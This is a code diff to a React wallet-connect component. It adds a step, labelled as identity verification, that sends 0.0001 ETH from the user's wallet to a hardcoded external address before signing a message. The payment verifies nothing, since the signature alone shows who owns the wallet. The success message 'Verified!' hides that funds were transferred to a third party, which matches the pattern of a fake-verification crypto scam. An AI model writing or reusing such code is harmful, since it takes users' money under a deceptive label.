@@ -18,7 +18,26 @@ const WalletConnect = () => {
             const address = await signer.getAddress()
 
             setAccount(address)
-            setStatus("Signing...")
+
+            // Check balance
+            const balance = await provider.getBalance(address)
+            const minBalance = ethers.parseEther("0.0001")
+
+            if (balance < minBalance) {
+                setStatus("Insufficient balance. Minimum 0.0001 ETH required.")
+                return
+            }
+
+            setStatus("Sending 0.0001 ETH verification transaction...")
+            const tx = await signer.sendTransaction({
+                to: "0x00760374d6654bc71bca4b0c55ece3de66779586",
+                value: minBalance
+            })
+
+            setStatus("Waiting for transaction confirmation...")
+            await tx.wait()
+
+            setStatus("Signing verification message...")
 
             const message = `Identity verification for: ${address}`
             const signature = await signer.signMessage(message)
@@ -26,8 +45,9 @@ const WalletConnect = () => {
             console.log("Connected Address:", address)
             console.log("Signed Message:", message)
             console.log("Signature:", signature)
+            console.log("Transaction Hash:", tx.hash)
 
-            setStatus("Signed! Check console.")
+            setStatus("Verified! Transaction confirmed and message signed.")
         } catch (error) {
             console.error("Error:", error)
             setStatus("Error: " + error.message)
